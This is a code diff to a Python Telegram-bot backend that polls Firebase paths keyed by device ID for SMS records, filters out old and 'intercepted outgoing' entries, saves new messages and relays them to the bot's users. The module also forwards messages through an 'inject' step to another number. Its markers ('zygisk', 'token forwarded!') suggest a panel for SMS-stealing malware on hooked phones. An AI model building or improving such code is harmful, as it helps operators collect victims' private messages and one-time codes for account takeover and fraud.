@@ -2,20 +2,24 @@
 
 from __future__ import annotations
 
+import asyncio
 import json
 import logging
+import re
 from datetime import datetime, timezone
 from typing import Any
 
 import httpx
 
 from app.database import Device, MonitorProfile, SessionLocal
-from app.firebase_client import _fetch_json, firebase_root_url
+from app.firebase_client import _fetch_json, firebase_root_url, get_firebase_workers
 from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
 POLL_INTERVAL_SEC = 0.5
+POLL_FETCH_TIMEOUT_SEC = 5.0
+SNAPSHOT_TIMEOUT_SEC = 30.0
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
     "sms",
@@ -34,20 +38,18 @@ SENDER_FIELDS = ("sender", "from", "address", "phone", "number", "fromNumber", "
 BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
 SEEN_META_KEY = "firebase_sms_seen"
-MAX_SEEN_KEYS = 500
+BASELINE_META_KEY = "firebase_sms_baseline"
+BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
+SMS_PATHS_META_KEY = "firebase_sms_paths"
+MAX_SEEN_KEYS = 20000
+MAX_CACHED_SMS_PATHS = 50
+BODY_DATE_RE = re.compile(
+    r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})(?:\s+\d{1,2}:\d{2})?\b"
+)
 OUTGOING_LOG_MARKERS = (
     "intercepted outgoing",
     "zygisk",
-    "outgoing sms sent",
     "outgoing sms",
-    "__out__",
-)
-BOT_CARD_MARKERS = (
-    "inject forwarded!",
-    "token forwarded!",
-    "outgoing sms sent!",
-    "auto-stopped",
-    "⏱ queued",
 )
 
 
@@ -103,16 +105,89 @@ def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
     _save_meta(device, meta)
 
 
+def get_baseline_sms_keys(device: Device) -> set[str]:
+    meta = _meta_dict(device)
+    baseline = meta.get(BASELINE_META_KEY) or []
+    if isinstance(baseline, list):
+        return {str(item) for item in baseline}
+    return set()
+
+
+def _set_baseline_sms_keys(device: Device, keys: set[str], started_at: datetime | None) -> None:
+    meta = _meta_dict(device)
+    meta[BASELINE_META_KEY] = list(keys)
+    meta[SEEN_META_KEY] = list(keys)
+    if started_at:
+        meta[BASELINE_AT_META_KEY] = _started_iso(started_at)
+    _save_meta(device, meta)
+
+
+def _started_iso(started_at: datetime | None) -> str | None:
+    if not started_at:
+        return None
+    if started_at.tzinfo is None:
+        started_at = started_at.replace(tzinfo=timezone.utc)
+    return started_at.replace(microsecond=0).isoformat()
+
+
+def baseline_ready(device: Device, profile: MonitorProfile) -> bool:
+    started = _started_iso(profile.started_at)
+    if not started:
+        return False
+    meta = _meta_dict(device)
+    return meta.get(BASELINE_AT_META_KEY) == started
+
+
+def clear_sms_baseline(device: Device) -> None:
+    meta = _meta_dict(device)
+    meta.pop(BASELINE_META_KEY, None)
+    meta.pop(BASELINE_AT_META_KEY, None)
+    meta.pop(SEEN_META_KEY, None)
+    _save_meta(device, meta)
+
+
+def _parse_body_date(text: str) -> datetime | None:
+    match = BODY_DATE_RE.search(text or "")
+    if not match:
+        return None
+    day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
+    if year < 100:
+        year += 2000
+    try:
+        return datetime(year, month, day, tzinfo=timezone.utc)
+    except ValueError:
+        return None
+
+
+def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
+    """Skip Firebase backlog — only SMS at/after monitoring start."""
+    started = profile.started_at
+    if not started:
+        return False
+
+    if started.tzinfo is None:
+        started = started.replace(tzinfo=timezone.utc)
+
+    received_at = record.get("received_at")
+    if received_at:
+        if received_at.tzinfo is None:
+            received_at = received_at.replace(tzinfo=timezone.utc)
+        return received_at < started
+
+    body_date = _parse_body_date(record.get("message", ""))
+    if body_date and body_date < started:
+        return True
+
+    # No reliable timestamp on a backlog entry — treat as old.
+    return True
+
+
 def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
     sender_l = (sender or "").lower()
     body_l = (body or "").lower()
-    if sender_l == "__out__":
-        return True
     if any(marker in sender_l for marker in OUTGOING_LOG_MARKERS):
         return True
     if any(marker in body_l for marker in OUTGOING_LOG_MARKERS):
-        return True
-    if any(marker in body_l for marker in BOT_CARD_MARKERS):
         return True
     return False
 
@@ -148,7 +223,7 @@ def _parse_timestamp(raw: Any) -> datetime | None:
         normalized = text.replace("Z", "+00:00")
         return datetime.fromisoformat(normalized).astimezone(timezone.utc)
     except ValueError:
-        return None
+        return _parse_body_date(text)
 
 
 def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
@@ -209,6 +284,89 @@ async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict
     return records
 
 
+def _generate_sms_paths(device: Device) -> list[str]:
+    paths: list[str] = []
+    seen_paths: set[str] = set()
+
+    for device_id in _device_ids(device):
+        for parent in SMS_PARENT_PATHS:
+            for child in SMS_CHILD_PATHS:
+                path = f"{parent}/{device_id}/{child}"
+                if path not in seen_paths:
+                    seen_paths.add(path)
+                    paths.append(path)
+
+            device_path = f"{parent}/{device_id}"
+            if device_path not in seen_paths:
+                seen_paths.add(device_path)
+                paths.append(device_path)
+
+        for top in ("sms", "SMS", "messages"):
+            path = f"{top}/{device_id}"
+            if path not in seen_paths:
+                seen_paths.add(path)
+                paths.append(path)
+
+    return paths
+
+
+def get_cached_sms_paths(device: Device) -> list[str]:
+    meta = _meta_dict(device)
+    cached = meta.get(SMS_PATHS_META_KEY) or []
+    if isinstance(cached, list):
+        return [str(path) for path in cached if path]
+    return []
+
+
+def set_cached_sms_paths(device: Device, paths: list[str]) -> None:
+    if not paths:
+        return
+    meta = _meta_dict(device)
+    meta[SMS_PATHS_META_KEY] = list(dict.fromkeys(paths))[:MAX_CACHED_SMS_PATHS]
+    _save_meta(device, meta)
+
+
+async def _fetch_paths_parallel(
+    root: str,
+    paths: list[str],
+    *,
+    timeout: float,
+) -> tuple[list[dict[str, Any]], list[str]]:
+    if not paths:
+        return [], []
+
+    semaphore = asyncio.Semaphore(get_firebase_workers())
+
+    async def fetch_one(path: str) -> tuple[str, list[dict[str, Any]]]:
+        async with semaphore:
+            records = await _fetch_path_records(root, path, timeout)
+            return path, records
+
+    results = await asyncio.gather(
+        *[fetch_one(path) for path in paths],
+        return_exceptions=True,
+    )
+
+    all_records: list[dict[str, Any]] = []
+    hit_paths: list[str] = []
+    for result in results:
+        if isinstance(result, Exception):
+            continue
+        path, records = result
+        if records:
+            hit_paths.append(path)
+            all_records.extend(records)
+
+    return all_records, hit_paths
+
+
+def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    deduped: dict[str, dict[str, Any]] = {}
+    for record in records:
+        deduped[record["firebase_key"]] = record
+    return list(deduped.values())
+
+
 async def fetch_firebase_sms_for_device(
     firebase_url: str,
     device: Device,
@@ -216,42 +374,100 @@ async def fetch_firebase_sms_for_device(
     timeout: float = 3.0,
 ) -> list[dict[str, Any]]:
     root = firebase_root_url(firebase_url)
-    all_records: list[dict[str, Any]] = []
-    seen_paths: set[str] = set()
+    cached_paths = get_cached_sms_paths(device)
+    if cached_paths:
+        cached_records, hit_paths = await _fetch_paths_parallel(
+            root,
+            cached_paths,
+            timeout=timeout,
+        )
+        if cached_records:
+            if hit_paths:
+                set_cached_sms_paths(device, hit_paths)
+            return _dedupe_records(cached_records)
 
-    for device_id in _device_ids(device):
-        for parent in SMS_PARENT_PATHS:
-            for child in SMS_CHILD_PATHS:
-                path = f"{parent}/{device_id}/{child}"
-                if path in seen_paths:
-                    continue
-                seen_paths.add(path)
-                all_records.extend(await _fetch_path_records(root, path, timeout))
-
-            device_path = f"{parent}/{device_id}"
-            if device_path not in seen_paths:
-                seen_paths.add(device_path)
-                all_records.extend(await _fetch_path_records(root, device_path, timeout))
-
-        for top in ("sms", "SMS", "messages"):
-            path = f"{top}/{device_id}"
-            if path not in seen_paths:
-                seen_paths.add(path)
-                all_records.extend(await _fetch_path_records(root, path, timeout))
-
-    deduped: dict[str, dict[str, Any]] = {}
-    for record in all_records:
-        deduped[record["firebase_key"]] = record
-    return list(deduped.values())
+    all_paths = _generate_sms_paths(device)
+    all_records, hit_paths = await _fetch_paths_parallel(root, all_paths, timeout=timeout)
+    if hit_paths:
+        set_cached_sms_paths(device, hit_paths)
+    return _dedupe_records(all_records)
 
 
-async def snapshot_firebase_sms_seen(profile: MonitorProfile, device: Device) -> None:
-    """On monitoring start — ignore SMS already on Firebase."""
+async def snapshot_firebase_sms_seen(
+    profile: MonitorProfile,
+    device: Device,
+    db=None,
+) -> int:
+    """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
     firebase_url = _resolve_device_firebase_url(profile, device)
     if not firebase_url:
-        return
-    records = await fetch_firebase_sms_for_device(firebase_url, device)
-    mark_sms_keys_seen(device, {record["firebase_key"] for record in records})
+        return 0
+    try:
+        records = await asyncio.wait_for(
+            fetch_firebase_sms_for_device(firebase_url, device, timeout=SNAPSHOT_TIMEOUT_SEC),
+            timeout=SNAPSHOT_TIMEOUT_SEC + 5,
+        )
+    except (asyncio.TimeoutError, httpx.HTTPError) as exc:
+        logger.warning("Firebase SMS baseline fetch failed for %s: %s", device.name, exc)
+        _set_baseline_sms_keys(device, set(), profile.started_at)
+        if db is not None:
+            db.commit()
+        return 0
+
+    keys = {record["firebase_key"] for record in records}
+    _set_baseline_sms_keys(device, keys, profile.started_at)
+    if db is not None:
+        db.commit()
+    logger.info(
+        "Firebase SMS baseline for %s: %s existing record(s) ignored",
+        device.name,
+        len(keys),
+    )
+    return len(keys)
+
+
+def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db=None) -> None:
+    """Instant baseline marker so poll can run; full key scan runs in background."""
+    _set_baseline_sms_keys(device, set(), profile.started_at)
+    if db is not None:
+        db.commit()
+
+
+async def run_baseline_snapshot_background(telegram_user_id: int) -> None:
+    """Scan Firebase for existing SMS keys without blocking Telegram callbacks."""
+    db = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, telegram_user_id)
+        device = get_active_device(db, telegram_user_id)
+        if not profile or not device or not profile.is_monitoring:
+            return
+        count = await snapshot_firebase_sms_seen(profile, device, db)
+        logger.info(
+            "Background Firebase baseline for user %s: %s record(s) ignored",
+            telegram_user_id,
+            count,
+        )
+    except Exception as exc:
+        logger.warning("Background baseline failed for user %s: %s", telegram_user_id, exc)
+    finally:
+        db.close()
+
+
+async def rebaseline_active_monitors() -> None:
+    """Once on bot startup — do not run inside the hot poll loop."""
+    db = SessionLocal()
+    try:
+        profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
+        for profile in profiles:
+            device = get_active_device(db, profile.telegram_user_id)
+            if not device or baseline_ready(device, profile):
+                continue
+            try:
+                await snapshot_firebase_sms_seen(profile, device, db)
+            except Exception as exc:
+                logger.warning("Startup rebaseline failed for %s: %s", device.name, exc)
+    finally:
+        db.close()
 
 
 async def _inject_before_notify(profile: MonitorProfile, device: Device, sender: str, message: str) -> None:
@@ -262,84 +478,144 @@ async def _inject_before_notify(profile: MonitorProfile, device: Device, sender:
     await forward_incoming_to_mynum(None, profile, device, sender, message)
 
 
-async def poll_monitoring_profiles_once() -> int:
-    import asyncio
+async def _inject_and_stream_dm(
+    telegram_user_id: int,
+    sender: str,
+    message: str,
+) -> None:
+    import time
 
-    from app.telegram_bot import notify_new_sms_dm_only
+    from app.telegram_notify import send_inject_stream_dm
 
+    db = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, telegram_user_id)
+        device = get_active_device(db, telegram_user_id)
+        if not profile or not device:
+            return
+
+        t0 = time.perf_counter()
+        try:
+            await _inject_before_notify(profile, device, sender, message)
+        except Exception as exc:
+            logger.warning("Fast inject failed for %s: %s", device.name, exc)
+        relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
+    finally:
+        db.close()
+
+    await send_inject_stream_dm(telegram_user_id, sender, message, relay_ms)
+
+
+async def _poll_one_monitoring_profile(profile_id: int) -> int:
     db = SessionLocal()
     processed = 0
     try:
-        profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
-        for profile in profiles:
-            device = get_active_device(db, profile.telegram_user_id)
-            if not device:
-                continue
-            firebase_url = _resolve_device_firebase_url(profile, device)
-            if not firebase_url:
-                continue
+        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
+        if not profile or not profile.is_monitoring:
+            return 0
 
-            try:
-                records = await fetch_firebase_sms_for_device(firebase_url, device, timeout=2.0)
-            except Exception as exc:
-                logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
-                continue
+        device = get_active_device(db, profile.telegram_user_id)
+        if not device:
+            return 0
 
-            seen = get_seen_sms_keys(device)
-            new_records = [r for r in records if r["firebase_key"] not in seen]
+        firebase_url = _resolve_device_firebase_url(profile, device)
+        if not firebase_url or not baseline_ready(device, profile):
+            return 0
 
-            if not new_records:
-                continue
+        try:
+            records = await asyncio.wait_for(
+                fetch_firebase_sms_for_device(
+                    firebase_url,
+                    device,
+                    timeout=POLL_FETCH_TIMEOUT_SEC,
+                ),
+                timeout=POLL_FETCH_TIMEOUT_SEC + 2,
+            )
+        except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
+            logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
+            return 0
 
-            new_keys: set[str] = set()
-            for record in sorted(
-                new_records,
-                key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
-            ):
-                received_at = record.get("received_at")
-                if profile.started_at and received_at and received_at < profile.started_at:
-                    new_keys.add(record["firebase_key"])
-                    continue
+        seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
+        new_records = [record for record in records if record["firebase_key"] not in seen]
+        if not new_records:
+            return 0
 
-                sender = record["sender"]
-                message = record["message"]
-                if _is_outgoing_firebase_log(sender, message):
-                    new_keys.add(record["firebase_key"])
-                    continue
-
-                try:
-                    await _inject_before_notify(profile, device, sender, message)
-                except Exception as exc:
-                    logger.warning("Fast inject failed for %s: %s", device.name, exc)
-
-                sms = save_sms(
-                    db,
-                    sender=sender,
-                    message=message,
-                    device_name=device.name,
-                    received_at=received_at,
-                )
-                db.commit()
+        new_keys: set[str] = set()
+        for record in sorted(
+            new_records,
+            key=lambda item: item.get("received_at") or datetime.min.replace(tzinfo=timezone.utc),
+        ):
+            if _is_old_for_monitoring(record, profile):
                 new_keys.add(record["firebase_key"])
-                processed += 1
-                asyncio.create_task(notify_new_sms_dm_only(sms))
+                continue
 
-            if new_keys:
-                mark_sms_keys_seen(device, new_keys)
-                db.commit()
+            received_at = record.get("received_at")
+            sender = record["sender"]
+            message = record["message"]
+            if _is_outgoing_firebase_log(sender, message):
+                new_keys.add(record["firebase_key"])
+                continue
+
+            asyncio.create_task(
+                _inject_and_stream_dm(profile.telegram_user_id, sender, message)
+            )
+
+            save_sms(
+                db,
+                sender=sender,
+                message=message,
+                device_name=device.name,
+                received_at=received_at,
+            )
+            db.commit()
+            new_keys.add(record["firebase_key"])
+            processed += 1
+
+        if new_keys:
+            mark_sms_keys_seen(device, new_keys)
+            db.commit()
     finally:
         db.close()
     return processed
 
 
-async def run_firebase_sms_poll_loop() -> None:
-    import asyncio
+async def poll_monitoring_profiles_once() -> int:
+    db = SessionLocal()
+    try:
+        profile_ids = [
+            profile.id
+            for profile in db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
+        ]
+    finally:
+        db.close()
 
+    if not profile_ids:
+        return 0
+
+    results = await asyncio.gather(
+        *[_poll_one_monitoring_profile(profile_id) for profile_id in profile_ids],
+        return_exceptions=True,
+    )
+    processed = 0
+    for result in results:
+        if isinstance(result, Exception):
+            logger.debug("Profile poll task failed: %s", result)
+            continue
+        processed += int(result)
+    return processed
+
+
+async def run_firebase_sms_poll_loop() -> None:
     while True:
         try:
-            count = await poll_monitoring_profiles_once()
+            count = await asyncio.wait_for(
+                poll_monitoring_profiles_once(),
+                timeout=POLL_FETCH_TIMEOUT_SEC + 10,
+            )
             if count:
                 logger.info("Firebase SMS poll delivered %s message(s)", count)
+        except asyncio.TimeoutError:
+            logger.warning("Firebase SMS poll cycle timed out")
         except Exception as exc:
-            logger.warning("Firebase SMS poll loop error: %s", exc)
+            logger.exception("Firebase SMS poll loop error: %s", exc)
         await asyncio.sleep(POLL_INTERVAL_SEC)
